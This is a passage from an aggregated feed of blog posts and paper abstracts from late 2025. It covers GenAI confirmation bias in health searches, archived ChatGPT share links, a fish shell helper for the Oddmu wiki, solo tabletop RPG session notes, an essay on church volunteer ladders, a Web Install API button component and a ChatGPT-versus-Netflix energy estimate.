AI: fewer people actually creating the work, and more people in
management roles overseeing the automated production.</p>
<h2>🔖 <a href="https://nyaspubs.onlinelibrary.wiley.com/doi/10.1111/nyas.15413">Generative artificial intelligence–mediated confirmation bias in healthinformation seeking</a></h2>
<p>Generative artificial intelligence (GenAI) applications, such as
ChatGPT, are transforming how individuals access health information,
offering conversational and highly personalized interactions. While
these technologies can enhance health literacy and decision-making,
their capacity to generate deeply tailored—hypercustomized—responses
risks amplifying confirmation bias by reinforcing pre-existing beliefs,
obscuring medical consensus, and perpetuating misinformation, posing
significant challenges to public health. This paper examines
GenAI-mediated confirmation bias in health information seeking, driven
by the interplay between GenAI’s hypercustomization capabilities and
users’ confirmatory tendencies. Drawing on parallels with traditional
online information-seeking behaviors, we identify three key “pressure
points” where biases might emerge: query phrasing, preference for
belief-consistent content, and resistance to belief-inconsistent
information. Using illustrative examples, we highlight the limitations
of existing safeguards and argue that even minor variations in
applications’ configuration (e.g., Custom GPT) can exacerbate these
biases along those pressure points. Given the widespread adoption and
fragmentation (e.g., OpenAI’s GPT Store) of GenAI applications, their
influence on health-seeking behaviors demands urgent attention. Since
technical safeguards alone may be insufficient, we propose a set of
interventions, including enhancing digital literacy, empowering users
with critical engagement strategies, and implementing robust regulatory
oversight. These recommendations aim to ensure the safe integration of
GenAI into daily life, supporting informed decision-making and
preserving the integrity of public understanding of health information.</p>

<p>A new Digital Digging investigation, here is the first one, conducted
with Belgian researcher Nicolas Deleur, has uncovered 110,000 ChatGPT
conversations preserved via Archive.org’s Wayback Machine. When users
click “share” on a ChatGPT conversation, they think they’re creating a
temporary link for a friend or colleague. What they don’t realize is
they were also creating a permanent, searchable record of their
thoughts, confessions, and sometimes illegal activities seen by
Archive.org.</p>

<p>As libraries continue to rely on a growing constellation of open
systems, standards, and services, questions of sustainability,
governance, and trust are more pressing than ever. This session will
explore what it means to build and maintain “trustworthy infrastructure”
in a decentralized and sometimes fractured landscape. Through high-level
discussion and examples drawn from the open source library ecosystem,
we’ll consider how community-led development, transparent
decision-making, and responsible stewardship can help ensure that open
infrastructure continues to meet the evolving needs of libraries and the
communities they serve. Participants will leave with a stronger
understanding of the values and challenges underpinning open library
systems, and how we might collaboratively shape a more resilient and
equitable future.</p>

<p>The scientific fields of complexity, Artificial Life (ALife), and
artificial intelligence (AI) share commonalities: historic, conceptual,
methodological, and philosophical. Although their origins trace back to
the 1940s birth of cybernetics, they were able to develop properly only
as modern information technology became available. In this perspective,
I offer a personal (and thus biased) account of the expectations and
limitations of these fields, some of which have their roots in the
limits of formal systems. I use interactions, self-organization,
emergence, and balance to compare different aspects of complexity,
ALife, and AI. Even when the trajectory of the article is influenced by
my personal experience, the general questions posed (which outweigh the
answers) will, I hope, be useful in aligning efforts in these fields
toward overcoming—or accepting—their limits.</p>

<h2>🔖 <a href="https://arxiv.org/abs/2511.01675">IncorrectCitation Association for Articles in Online-Only Springer NatureJournals</a></h2>
<p>We show that citation metrics of journal articles in many of the
online-only Springer Nature journals and associated ones are distorted,
going back to articles from 2001. We find that most likely due to an API
response error, there are many incorrect references which typically lead
to Article Number 1 of a given Volume. Among others, the issue affects
journals such as Scientific Reports, Nature Communications,
Communications journals, Cell Death &amp; Disease, Light: Science &amp;
Applications, as well as many BMC, Discovery and npj journals. Beyond
the negative effect of introducing incorrect reference information, this
distorts the citation statistics of articles in these journals, with a
few articles being massively over-cited compared to their peers, while
many lose citations; e.g. both in Scientific Reports and in Nature
Communications, 5 of the 10 top cited articles have article numbers of
1. We validate the distorted statistics by assessing data from multiple
scientific literature databases: Crossref, OpenCitations, Semantic
Scholar, and the journals’ websites. The issue primarily arises from the
inconsistent transition from page-based referencing of articles to
article number-based referencing, as well as the improper handling of
the change in the publisher’s article metadata API. It seems that the
most pressing problem has been present since approximately 2011, which
we estimate affects the citation count of millions of authors.</p>

(date: 2025-11-30)
      <p>
      <h1>2025-11-30 Oddμ new</h1>
<p>I recently decided I needed a new <code>oddmu new</code> command so that I could
quickly start writing a new page. I ended up writing a <code>fish</code> function
instead of adding code to Oddμ itself.</p>
<pre><code>function oddmu
    if test &quot;$argv[1]&quot; = new
       set date (date --iso)
       if test -z $argv[2]
          set filename $date.md
       else
          set filename (date --iso)-$argv[2].md
       end
       if test ! -f &quot;$filename&quot;
           echo &quot;# $date &quot; &gt;&gt; $filename
       end
       if $EDITOR $filename
           oddmu notify $filename
       end
    else
        command oddmu $argv
    end
end

</code></pre>
<p>When I run <code>oddmu new something</code> on the command line, it creates a
page for the current day and “today”, calls my favourite editor to
edit it, and calls <code>oddmu notify</code> on the newly created file at the
end.</p>
<p>This works well with the <code>make snapshot</code>, <code>make download</code>, <code>make diff</code>
and <code>make upload</code> commands based on the <a href="/wiki/Makefile">Makefile</a>.</p>

<p>Sometimes enough is enough. I come home from a social occasion, it’s
past midnight, we’re drinking tea, can’t quite go to bed yet after so
much activity. So many people. My ears are still humming from all the
noise. I am hoarse because of the shouting. I am afraid because of
infectious diseases and bad ventilations.</p>
<p>And when I sit down at the laptop in the living room, I wanted some
aimless drifting across the timeline, a little <a href="Emacs">Emacs</a> and<a href="Oddmu">Oddmu</a>, perhaps. And then I think that on this laptop, I can look
at social media using a text user interface (TUI), namely <code>toot tui</code>.
And there’s the German police escorting politicians of the far right
through a demonstration; there’s the German police beating up a
demonstration, there’s that politician decrying the violence of the
demonstrators, and here I am thinking, the Germans voted for this.
This is the party that’s aiding and abetting the far right. Ugh.</p>
<p>And there’s the US military double tapping helpless people swimming in
the water after they were shot. Using military force against
civilians, committing war crimes.</p>
<p>Has Israel stopped the genocide? Allowed people to return, paid for
the damages done, paid restitutions for the civilians killed?</p>
<p>Has Russia stopped the invasion of Ukraine? Have they stopped
targeting civilians? Are they still committing war crimes?</p>
<p>Ah, and what about the ongoing disaster in Sudan?</p>

Special thanks to Ibuki Omatsu (Unix Domain Socket implementation and bug fixing),
Wildan Mubarok (bug fixing and implementation of missing functions),
and other contributors for making it possible.
Smallvil performance on Redox is not adequate, so we still have work to do on Wayland support,
but this represents a huge step forward.</p>

      <h1>One thing churches do well</h1>

(date: 2025-11-29)
      <p>
      <p>Two friends of mine (brothers, actually) got laid off from their job at a megachurch here in Austin. We met through a mutual friend that started attending their church. Our kids hang out on Roblox, so we’re connected through dadship and games. They oversaw a lot of the music and arts work that went into the weekly service. I wasn’t involved in the church so their unceremonious departure doesn’t impact me as much as folks in their community, but friends losing work is not fun and I feel for their families.</p>
<p>[Smash cut: my son on stage playing in front of pretend groupies]</p>
<p>My son is learning to play the guitar at School of Rock. One cool aspect about the School of Rock program is that you go from knowing nothing to performing a rock show in ~4 months after signing up. Recitals are nothing new when learning an instrument or a performing art, but those in my experience tend to be on longer annual timescales. School of Rock throws you in the deep end and that rock show commitment adds a lot of positive pressure to learn your instrument.</p>
<p>[Smash cut: me journaling in a coffee shop in my twenties]</p>
<p>These coinciding events got me thinking about church, music, and the relationship there of improving your craft through regular opportunities to perform. I thought about my past, my friends’ pasts, and my son’s potential future and I realized something that one thing faith-based communities do well is that they offer an endless series of opportunities for people to improve and show-off their talents.</p>
<p>At the heart of that is a not-so-secret ladder system. Nearly every faith community I’ve been apart of has had a buffet of special interest groups to rope newcomers in and get them involved at a level that matches their skill. They ask you about your interests and then encourage you<a href="#fn1">1</a> to use those in service of the community.</p>
<ul>
<li>Play music? You can play for a small group. Prove yourself and move onto the Wednesday service. Ready for the big Sunday show? Start as the fifth guitar. Then the third. Then lead.</li>
<li>Artistic? You do art with kids in Sunday school. Move on to making artsy b-roll videos. Your art in front of everyone in the big church: a painting, a solo, a poem, an interpretive dance!</li>
<li>Make websites or graphics? You can manage the WordPress, make the PowerPoints legible, make the weekly pamphlets, improve the signage, and spruce up the walls.</li>
<li>Like to talk in front of people? Go to a small group. Lead a small group. Lead a mission trip. Get on stage during the Sunday service. Lead the Sunday service when the pastor is out.</li>
<li>Have a knack for organizing people? Join a special interest group and invite friends. Encourage people to volunteer for the local Habitat for Humanity outreach. Be the greeter who connects people to special interest groups.</li>
<li>A closeted queer kid that loves theater? There’s the big Christmas show –sometimes with live animals!– that happens every year. Churches and youth groups love skits (for some weird reason). And the technical queers can run the soundboard or manage the lights. You may even get a headset.</li>
<li>Know a lot about a particular topic (bible, finance, history)? Lead a Sunday school class about it. Host a weekend seminar. A whole week seminar.</li>
<li>Handy? Join the church cleanup. Volunteer to fix that leaking window. Fix the broken A/C. Organize a shed or barn raising. Run the Habitat for Humanity group. Be the knowledgeable one on the mission trip.</li>
</ul>
<p>There’s no shortage of jobs in a thriving community. And while some jobs skew business (the treasurer), administrative (the secretary), or mechanical (the maintenance crew); the bulk of jobs fall under the umbrella of the performing and visual arts. I find this curious in a world where getting a degree in fine arts is often chided or joked about as being non-contributing.</p>
<p>I assume other religions across the world have different flavors of these ladders of opportunity. And I assume secular volunteer organizations might have these kinds of ladders, but I imagine they have way less acoustic guitars. The “speaker circuit” in tech sort of functions like this; local meetup, to regional conference, to national, to international, to keynote speaker, to giving a TED Talk ladder is familiar.</p>
<p>Why would a church provide this service? What is this platform for the performing and visual arts worth? Well I can tell you we pay ~$400/month for School of Rock, so it’s somewhere in that ballpark. It’s possible this social apparatus does return dividends in the offering plate, but I think the key benefit this provides is a place of belonging. A place to exercise talents publicly and regularly that might otherwise remain dormant. Creating that ladder of opportunity is effective at keeping “involvement” –a community’s most important metric by which it lives and dies– at an all time high and engagement keeps the machine turning.</p>
<p>[Smash cut: an announcement board with a hand-drawn thermometer that’s half-filled and renderings of a new building mounted with poster putty]</p>
<p>In most of my experiences at a certain point (when money exchanges hands) and at a certain scale (over ~150 people), the church ladder begins to posture itself towards being another capitalistic corporate ladder with patriarchal undertones. The eternal growth model and the innate desire to build ever larger buildings replace vision and connection. The work becomes about managing real estate and optimizing to keep the pews full. Efficiency rises, the arts and music morph into a Live, Laugh, Love poster with mass appeal.</p>
<p>Anyways, if you were trying to build a new community (or replace religion with something more compassionate)… I would think about building these kinds of ladders. I have no doubt you’ve encountered someone who has developed their gifts or skills in an incubator like this. You may even be reading a person-like-that’s blog right now.</p>

      <p>I've assumed that all WordPress sites hosted on wordpress.com or running JetPack would have data about the site id, and for each item, the post id. It turns out it's not that simple?</p>
<p>A couple of examples:</p>

<li><a href="https://daveverse.org/feed/">daveverse.org/feed/</a> -- has these elements</li>
<li><a href="https://scripting4.wordpress.com/feed/">scripting5.wordpress.com/feed/</a> -- doesn't have them</li>
</ul>
<p>I have of course asked ChatGPT, and got a lot of wrong answers.</p>
<p>It's important because this data is used to connect blog posts to the editor, for posts you can edit. It's really important that editing is accomplished by at most a single click, when you're viewing it in a reader app.</p>
<p>I should be able to click on an edit icon from the viewer to open it in the editor, assuming it's my post.</p>
<p>It also figures heavily in the <a href="http://scripting.com/2025/11/25/180612.html">discourse</a> feature.</p>

      <h1>2025-11-29 First Kinetic Energy Adventure</h1>

(date: 2025-11-29)
      <p>
      <h1>2025-11-29 First Kinetic Energy Adventure</h1>
<p>Given the two patrons and the option to learn about a third patron in<a href="2025-11-25-first-session.md">the last blog post</a>, what do the
characters decide?</p>
<p>I think Urs, knowing the two patrons he has access to, and knowing
about is bad Strength, is reluctant to go and fight in underground
tunnels. Bia’s offer of evacuating Mrs. Orti to Sobia sounds more like
something he’s into. Sam has Car-1 and can drive, so she’s into it as
well. Trent and Quveisa aren’t against it, but they want to know a bit
more.</p>
<p>It’s agreed, then. They all spend some time looking into job.</p>
<p>Mr. Orno is Sam’s contact back in the long haul business, at <em>Quality</em>
<em>Intelligence</em>. Perhaps Sam can borrow a car for the drive? Let’s check
Status + Dive. Rolled a 7 on 2d6 which is barely ≤ 6 + 1. Mr. Orno
does have a car available for old time’s sake. “Sure, you can have
this sand buggy for a week. Enjoy your trip to the Oasis!”</p>
<p>Trent needs a weapon. Can the patron provide one? Sadly, with Status-2
Bia has no resources at her disposal. But she knows a guy who might be
willing to hand over a pistol. She gives Urs an address and Urs passes
it along. Urs is afraid of an ambush (the players don’t know that Bia
has a pretty high Loyalty-9) so Trent wants to take precautions and
scout out the surroundings, first. We already know that Bia means
Trent no harm, and it’s a bit early for <em>House of Esre</em> to send in
assassins. But perhaps they are trying to learn more about Trent? A
hard Intelligence + Tactics check might reveal something. Rolled 13 on
3d6 which is not ≤ 10 + 1. Trent does not see that he’s being tailed
and gets the pistol.</p>
<p>Urs wants to learn about the reasons Mrs. Orti needs to disappear for
a while. Bia tells him about the security forces of Inus Xein
Pharmaceuticals trying to get Mrs. Orti. Urs tries to learn more about
the corp but a check of Education + Library is impossible: Education-2
and no Library skill would make this a 2d6 ≤ 2 - 2 roll. He decides to
talk to Mrs. Orti instead. Intelligence + People is more likely to
succeed. Rolled 10 on 2d6 which is not ≤ 6 + 2. Mrs. Orti is
tight-lipped when asked about the reasons. “It’s better if you don’t
know. All you need to know is that the earlier we leave, the better.”</p>
<p>“We can leave now,” he says.</p>
<p>And so they leave starport area one early morning in that borrowed
jeep: Sam at the wheel, Trent with the pistol next to her, Quveisa and
Urs in the back, Mrs. Orti between them. The jeep is filled with Mrs.
Orti’s bags, an extra tire, some tools, water tanks, and biscuits.</p>
<p>From the point of view of the referee, they could have spent a bit
more time on getting better intel.</p>
<p>At night, Trent hands the gun to Sam. “I’m pretty good in unarmed
combat. When we’re not driving, you should carry the gun.” Trent also
wants to make sure the area is safe. Nobody has the Survival skill and
the best Education the party brings to the table is 4. Sam or Trent
need to roll snake-eyes (2) because of 4 - 2 for lacking the skill.
Sam misses widely but Trent rolls a 3. It’s still a miss but the
referee confirms that the desert does not feel safe.</p>
<p>At night, six Rarein Crabs show up! They roll 2 on 2d6 which is ≤ 10
so they want to attack. Trent wants to ambush them using
Intelligence + Tactics and rolls 5 on 2d6 which is ≤ 10 + 1. A free
round!</p>
<p>“Everybody into the car!” shouts Sam and tries to do a getaway using
Dexterity and Car. Rolled 5 on 2d6 which is ≤ 5 + 1.</p>
<p>They all make it.</p>
<p>This could have been rough. The party wants to be more careful. This
means more information gathering before doing anything else. But now
they’re in the middle of the desert with no library access at all. Use
the computer networks? Maybe not. Who knows who is watching. Is there
a tracker on this car? The party has no tools to monitor network
traffic but perhaps one could hack into the car computer? It’s a hard
Intelligence + Computer check. Urs has 7, Sam has 9. Sam will do it
and rolls an 8. Success. The car is not bugged. Ok! Sam takes the car
offline. That means they feel comfortable continuing to drive, at
least under the cover of night.</p>
<p>Soon, Sobia comes into view. What now? Check the news, passively.
Check for an ambush, while driving?</p>
<p>First, Intelligence + Infiltrate to learn more about the situation.
Nobody has the skill and Trent has Intelligence-10, so roll 2d6 ≤
10 - 2. Rolled 9, a miss. No suspicious messages.</p>
<p>Next deploy slowly, carefully. Make a hard check Intelligence +
Tactics to outmanoeuvre any bad guys, since this time there really is
an ambush and the party doesn’t just want to have an extra round. They
want to avoid the encounter. Trent does it, again. Rolled 9 ≤ 11.</p>
<p>They get off the car, buy some local garb, get out the back entrance
of the shop and start moving through the souk towards the Lelerino
caravansary. Suddenly Mrs. Orti turns to the right. “I don’t want to
join the Lelerino long-distance caravan. Take me to the Quatilti
Orchards and Biotech office and I’ll owe you one.”</p>
<p>“No way!” says Sam. “Staying here is not safe. Didn’t you see the
observers on the rooftops that Trent pointed out to us?”</p>
<p>“I don’t care! The Lelerino are not safe, either.”</p>
<p>The party is confounded. What would Bia say? Calling here now, from
the Souk, doesn’t seem safe at all.</p>
<p>Trent offers to go and check it out, see how safe it is. He’s still
benefitting from his successful check and soon realises that multiple
armed agents are stalking the Quatilti Orchards and Biotech office. He
returns and says: “No way this is safe.”</p>
<p>Sam nods. “The Lelerino it is, then. Let’s go.” This is a question of
Status and Discipline! Urs does have Status-10 but lacks the skill.
Does he want to use Deception instead and lie to Mrs. Orti? “No, I’m
an honest guy and perhaps we’ll meet her again.” Rolled 5 ≤ 10 - 2 and
succeeded. So, by status, authority or force of will, the party moves
to the caravansary.</p>
<p>“Here we are,” says Sam.</p>
<p>“Thanks,” whispers Mrs. Orti.</p>
<p>Quveisa looks unhappily at Trent.</p>
<p>Trent is working his jaw. “We’ll see you again, promised.”</p>

      <h1>2025-11-25 Prepare for the first session of Kinetic Energy</h1>

(date: 2025-11-29)
      <p>
      <h1>2025-11-25 Prepare for the first session of Kinetic Energy</h1>
<p>Let’s review the characters we created <a href="2025-11-24-character-creation">yesterday</a>.</p>
<p><strong>Sam Cein</strong>. Strength-7, Dexterity-5, Endurance-10, Intelligence-6,
Education-4, Status-6; Knife-1, Handgun-1, Car-1, Computer-3,
Engineer-1, Medical-1, Pilot-1. Contact: <strong>Mr. Orno</strong>.</p>
<p><strong>Trent Sosoitti</strong>: Strength-7, Dexterity-7, Endurance-6,
Intelligence-10, Education-4, Status-7; Fight-1. Handgun-1, Knife-1,
Rifle-2, Unarmed-1, Bureaucracy-7, Culture-1, Deception-1,
Diplomacy-1, Literacy-5, People-3, Tactics-1. He wanted to be a
fighter and did that, but on the way he ended up being well read, a
true poet, and astonishingly comfortable with the machinations of
forms, taxes, reports, grant proposals, project management,
slide-decks and spreadsheets. Companion: <strong>Quveisa</strong>, Strength-10,
Dexterity-9, Endurance-8, Intelligence-8, Education-4, Status-7.
Enemies: <strong>House of Esre</strong>.</p>
<p><strong>Urs Xegevela</strong>. Strength-2 Dexterity-7 Endurance-6 Intelligence-6
Education-2 Status-10; Bureaucracy-3, Deception-4, Computer-1,
Crime-1, Literacy-3, People-2, Science-3. Patrons: <strong>Onorce</strong> and<strong>Bia</strong>. Membership: <strong>Sector Trade Guild</strong>.</p>
<h2>Status</h2>
<p>Let’s look at the Status attribute. 7 is what I would consider an
honest citizen of the empire. The axis is important. Outside the
empire, your status would immediately drop and it would take a
lifetime to get back up.</p>
<p>So Sam with Status-6 has less status than an average citizen. Those
years lost on that other planet make themselves known. People wonder:
Did Sam break the law? Did Sam take drugs? People suspect something
but can’t quite put their finger on it.</p>
<p>Trent and Quveisa both have Status-7 and belong to the masses of the
empire. Live like a mouse. Remain unnoticed.</p>
<p>Urs, however, is different. Status-10 is close to nobility. So who is
close to nobility? People useful to the empire. People working in
their administration, close to the court; friends of young nobles who
were talented but sadly lacked the right connections. There is that
class ceiling. No matter how hard you try: you can get a good job but
you can never stop working.</p>
<h2>Patrons</h2>
<p>Urs is a member of the Sector Trade Guild. This guild is described as
follows:</p>
<blockquote>
<p>The trade guilds deal in moving people, supplying remote colonies
with essential goods and transporting news and mail. They don’t care
for the empire itself but they do care about safety and people.
Together, you can achieve much.</p>
</blockquote>
<p>I used this to write the following about the two patrons Urs also
gained:</p>
<blockquote>
<p>Onorce is a resistance organiser on Xerailri station, secretive,
involved in Deep Sewer Maintenance and Management. Bia is a local
crime lord involved in skimming material off imperial production and
smuggling it to a rebel base.</p>
</blockquote>
<p>Time to work out the index cards for these two patrons!</p>
<h2>Onorce</h2>
<p>AttributesOtherStatus12NameOnorce (they/them)Gravitas6AppearancebaldParanoia7MembershipHouse Xerailri, Deep Sewer Maintenance and ManagementHonesty7InterestsGetting their inheritance backLoyalty3JobsFind the underground passage to the arena</p>
<p>Long term, I think it’s clear that Onorce is interested in the
inheritance and is ready to throw all former allies under the bus in
order to get it. They’re a dangerous ally.</p>
<p>Job: Find an underground passage from the warehouses of Xerailri
station into the tunnels of the sewer system and link up with the
Diusatus clan who is controlling the old arena.</p>
<p>Library check: It’s a covered market these days and the Diusatus
family owns the market license.</p>
<p>Crime check: Financially, the Diusatus clan is failing. House Xerailri
is not benefiting enough and is thinking of replacing the Diusatus,
eventually (a future hook).</p>
<p>Computer check: The maps are not longer accessible. Somebody has
erased them. There are signature traces of the Chainsaw Juggler hacker
collective (a future hook).</p>
<p>The tunnels are the home turf of the Mabiuses, a gang of 4: average 7,
Unarmed+1, Knife+1, Handgun+1, Infiltrate+1. Their preferred weapons
in these tunnels are knives because they know that if they aren’t
quiet in these tunnels, a security bot arrives.</p>
<p>The EX-Secure-Life-2b has Damage-9 Endurance-10 Life-9 Attack-9 Hit-9
Escape-4 and counts as an armoured target.</p>
<h2>Bia</h2>
<p>AttributesOtherStatus2NameBia (they/them)Gravitas7Appearancewild short black hair, lab coatParanoia4MembershipHeavenly Gaze mutual aid societyHonesty9InterestsTaking over an imperial production plantLoyalty7JobsDrive Mrs. Orti to Sobia, an oasis town</p>
<p>A crime lord with Status-2 is difficult to imagine. Perhaps we need to
think of Bia as a recent arrival, a rebel agent without friends who
can’t even mobilise assets from fellow gang members. I think this
means Bia is in dire straits and needs help. In return, they can offer
knowledge and opportunities. It’s the honesty that makes this a
likeable patron.</p>
<p>Job: Escort Mrs. Orti to the oasis town of Sobia. She’s on the run
from the security forces of Inus Xein Pharmaceuticals because of some
non-disclosure violation. Bia is hoping to recruit Mrs. Orti into the
rebellion and suggested hiding among the Lelerino people who will pick
her up in Sobia. She’ll go onto a half-year caravan trip until things
have calmed down.</p>
<p>People check: She doesn’t really want to go. Fear makes her go but
she’d prefer access to a lab and she knows a lab in Sobia, Quatilti
Orchards and Biotech (a choice to make).</p>
<p>Culture check: The Lelerino people are rough and it’s not at all clear
that staying with them is safe.</p>
<p>Bureaucracy check: Mrs. Orti leaked safety concerns to the leftist
press and now she is indeed wanted for trial. Disappearance is likely.</p>
<p>Library check: The Sobia desert is famed for Rarein Crabs. Number-6
Damage-9 Endurance-4 Life-6 Attack-10 Hit-11 Escape-4. Very dangerous.
They look armoured but it’s actually easy to slide a blade between
their scales.</p>
<p>There’s an ambush waiting for Mrs. Orti at Quatilti Orchards and
Biotech. Make a Tactics check to avoid the ambush. Five people,
armoured, average 7, Handgun-1. If any escape or gets to transmit
their identities back to the team commando, Inus Xein Pharmaceuticals
turns into a regular enemy (future hook).</p>
<h2>Another patron</h2>
<p>I feel that there should perhaps be a third option. Or perhaps there
should be an option to find one.</p>
<p>Perhaps Mr. Diusatus, the organisation running the market in the old
arena could use some help. In order get on their good sides, uncover
the crime gang that’s extorting the merchants.</p>
<p>They operate from the Lemaloed Fight Club. All twenty of them are fit
8, Unarmed-1, Knife-1, Discipline-1. Outside the fight club, they show
up in groups of three. In the evening, they’re all at the club. Their
boss is Onti Lemaloed. Nobody has to die for this to succeed.</p>
<p>Note that if the party starts out without patrons, then you should prepare three potential patrons and how to get them. The information one can learn about them before doing this should allow players to decide whether they represent topics they care about. As such, the choice between patrons is a bike voting with your feet. Players get to express their preferences in-game.</p>

      <h1>Installing web apps</h1>

(date: 2025-11-29)
      <p>
      <p>Safari, Chrome, and Edge all allow you to <a href="https://adactio.com/journal/20520">install websites as though they’re apps</a>.</p>
<p>On mobile Safari, this is done with the “Add to home screen” option that’s <a href="https://adactio.com/journal/18772">buried deep in the “share” menu</a>, making it all but useless.</p>
<p>On the desktop, this is “Add to dock” in Safari, or “Install” in Chrome or Edge.</p>
<p>Firefox doesn’t offer this functionality, which as a shame. Firefox is my browser of choice but they decided a while back to completely abandon progressive web apps (though <a href="https://www.ghacks.net/2025/03/17/firefox-mozilla-is-working-on-progressive-web-apps-pwa-support/">they might reverse that decision</a> soon).</p>
<p>Anyway, being able to install websites as apps is fantastic! I’ve got a number of these “apps” in my dock: Mastodon, Bluesky, Instagram, <a href="https://thesession.org/">The Session</a>, Google Calendar, Google Meet. They all behave just like native apps. I can’t even tell which browser I used to initially install them.</p>
<p>If you’d like to prompt users to install your website as an app, there’s not much you can do other than <a href="https://thesession.org/app">show them how to do it</a>. But that might be about to change…</p>
<p>I’ve been eagerly watching the proposal for a <a href="https://github.com/MicrosoftEdge/MSEdgeExplainers/blob/main/WebInstall/explainer-current-doc.md">Web Install API</a>. This would allow authors to put a button on a page that, when clicked, would trigger the installation process (the user would still need to confirm this, of course).</p>
<p>Right now it’s a JavaScript API called <code>navigator.install</code>, but there’s talk of having a declarative version too. Personally, <a href="https://github.com/openui/open-ui/issues/972#issuecomment-2167742211">I think</a> this would be an ideal job for an <a href="https://developer.mozilla.org/en-US/docs/Web/API/Invoker_Commands_API">invoker command</a>. Making <a href="https://github.com/WICG/install-element">a whole new <code>install</code> element</a> seems ludicrously over-engineered to me when <code>button invoketarget=&quot;share&quot;</code> is right there.</p>
<p>Microsoft recently announced that they’d be <a href="https://blogs.windows.com/msedgedev/2025/11/24/the-web-install-api-is-ready-for-testing/">testing the JavaScript API in an origin trial</a>. I immediately <a href="https://developer.microsoft.com/en-us/microsoft-edge/origin-trials/trials/bcf7d28f-6bdf-45d8-9207-63c97a042407">signed up</a> The Session for the trial. Then I updated the site to output the appropriate HTTP header.</p>
<p>You still need to mess around in the browser configs to test this locally. Go to <code>edge://flags</code> or <code>chrome://flags/</code> and search for ‘Web App Installation API’, enable it and restart.</p>
<p>I’m now using this API on the homepage of <a href="https://thesession.org/">The Session</a>. Unsurprisingly, I’ve wrapped up the functionality into an <a href="https://adactio.com/journal/20618">HTML web component</a> that I call <code>button-install</code>.</p>
<p><a href="https://gist.github.com/adactio/a445544723363d37b9c31a74a03ef928">Here’s the code</a>. You use it like this:</p>
<pre><code>&lt;button-install&gt;
  &lt;button&gt;Install the app&lt;/button&gt;
&lt;/button-install&gt;

</code></pre>
<p>Use whatever text you like inside the button.</p>
<p>I wasn’t sure whether to keep the <code>button</code> element in the regular DOM or generate it in the Shadow DOM of the custom element. Seeing as the button requires JavaScript to do anything, the Shadow DOM option would make sense. As Tess put it, <a href="https://tess.oconnor.cx/2023/11/shadow-dom">Shadow DOM is for hiding your shame</a>—the bits of your interface that depend on JavaScript.</p>
<p>In the end I decided to stick with a regular <code>button</code> element within the custom element, but I take steps to remove it when it’s not necessary.</p>
<p>There’s a potential issue in having an element that could self-destruct if the browser doesn’t cut the mustard. There might be a flash of seeing the button before it gets removed. That could even cause a nasty layout shift.</p>
<p>So far I haven’t seen this problem myself but I should probably use something like <a href="https://scottjehl.com/posts/web-component-self-destruct-css/">Scott’s CSS</a> in reverse: fade <em>in</em> the button with a little delay (during which time the button might end up getting removed anyway).</p>
<p>My <code>connectedCallback</code> method starts by finding the button nested in the custom element:</p>
<pre><code>class ButtonInstall extends HTMLElement {
  connectedCallback () {
    this.button = this.querySelector('button');
    …
  }
customElements.define('button-install', ButtonInstall);

</code></pre>
<p>If the <code>navigator.install</code> method doesn’t exist, remove the button.</p>
<pre><code>if (!navigator.install) {
  this.button.remove();
  return;
}

</code></pre>
<p>If the current <code>display-mode</code> is <code>standalone</code>, then the site has already been installed, so remove the button.</p>
<pre><code>if (window.matchMedia('(display-mode: standalone)').matches) {
  this.button.remove();
  return;
}

</code></pre>
<p>As an extra measure, I could also use the <code>display-mode</code> media query in CSS to hide the button:</p>
<pre><code>@media (display-mode: standalone) {
  button-install button {
    display: none;
  }
}

</code></pre>
<p>If the button has survived these tests, I can wire it up to the <code>navigator.install</code> method:</p>
<pre><code>this.button.addEventListener('click', async (ev) =&gt; {
  await navigator.install();
});

</code></pre>
<p>That’s all I’m doing for now. I’m not doing any <code>try</code>/ <code>catch</code> stuff to handle all the permutations of what might happen next. I just hand it over to the browser from there.</p>
<p>Feel free to <a href="https://gist.github.com/adactio/a445544723363d37b9c31a74a03ef928">use this code</a> if you want. Adjust the code as needed. If your manifest file says <code>display: fullscreen</code> you’ll need to change the test in the JavaScript accordingly.</p>
<p>Oh, and make sure your site already has a manifest file that has an <code>id</code> field in it. That’s required for <code>navigator.install</code> to work.</p>

(date: 2025-11-29)
      <p>
      <p><strong><a href="https://interconnected.org/home/2025/11/28/plumbing">Context plumbing</a></strong></p>
<p>Matt Webb coins the term <strong>context plumbing</strong> to describe the kind of engineering needed to feed agents the right context at the right time:</p>
<blockquote>
<p>Context appears at disparate sources, by user activity or changes in the user’s environment: what they’re working on changes, emails appear, documents are edited, it’s no longer sunny outside, the available tools have been updated.</p>
<p>This context is not always where the AI runs (and the AI runs as closer as possible to the point of user intent).</p>
<p>So the job of making an agent run really well is to move the context to where it needs to be. [...]</p>
<p>So I’ve been thinking of AI system technical architecture as plumbing the sources and sinks of context.</p>

      <h1>A ChatGPT prompt equals about 5.1 seconds of Netflix</h1>

(date: 2025-11-29)
      <p>
      <p>In June 2025 <a href="https://blog.samaltman.com/the-gentle-singularity">Sam Altman claimed</a> about ChatGPT that &quot;the average query uses about 0.34 watt-hours&quot;.</p>
<p>In March 2020 <a href="https://www.weforum.org/stories/2020/03/carbon-footprint-netflix-video-streaming-climate-change/">George Kamiya of the International Energy Agency estimated</a> that &quot;streaming a Netflix video in 2019 typically consumed 0.12-0.24kWh of electricity per hour&quot; - that's 240 watt-hours per Netflix hour at the higher end.</p>
<p>Assuming that higher end, a ChatGPT prompt by Sam Altman's estimate uses:</p>
<p><code>0.34 Wh / (240 Wh / 3600 seconds) =</code> 5.1 seconds of Netflix</p>
<p>Or double that, 10.2 seconds, if you take the lower end of the Netflix estimate instead.</p>
<p>I'm always interested in anything that can help contextualize a number like &quot;0.34 watt-hours&quot; - I think this comparison to Netflix is a neat way of doing that.</p>
<p>This is evidently not the whole story with regards to <a href="https://simonwillison.net/tags/ai-energy-usage/">AI energy usage</a> - training costs, data center buildout costs and the ongoing fierce competition between the providers all add up to a very significant carbon footprint for the AI industry as a whole.</p>
<p>(I got some help from ChatGPT to <a href="https://chatgpt.com/share/692a52cd-be04-8006-bb01-fbd68aae05ba">dig these numbers out</a>, but I then confirmed the source, ran the calculations myself, and had Claude Opus 4.5 <a href="https://claude.ai/share/0a1792e6-6650-4ad3-8d01-99d8eeccb7f0">run an additional fact check</a>.)</p>

      <h1>Bluesky Thread Viewer thread by @simonwillison.net</h1>

<p>I've been having a lot of fun hacking on my Bluesky Thread Viewer JavaScript tool with Claude Code recently. Here it renders a thread (complete with <a href="https://bsky.app/profile/simonwillison.net/post/3m6pmebfass24">demo video</a>) talking about the latest improvements to the tool itself.</p>
